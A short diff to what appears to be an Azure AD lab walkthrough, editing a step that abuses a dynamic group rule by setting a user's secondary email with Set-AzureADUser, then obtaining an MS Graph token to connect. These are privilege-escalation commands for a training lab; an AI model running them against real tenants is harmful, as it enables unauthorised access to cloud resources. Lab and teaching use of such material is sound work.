@@ -1413,11 +1413,11 @@ Connect-AzAccount -Credential $creds -TenantId b6e0615d-2c17-46b3-922c-491c91624
 Now, to abuse Dynamic group rule, we need to edit the secondary email for the studentx. Let's do that using the below command.
 Get the ObjectId using the user Thomas by looking at profile of studentx. Remember to replace the UserPrincipalName and ObjectId: 
 ```
-Update-MgUser -UserId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com
+Set-AzureADUser -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose
 ```
 
 
-OR MS Graph:
+OR via MS Graph:
 ```
 $Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token 
 Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
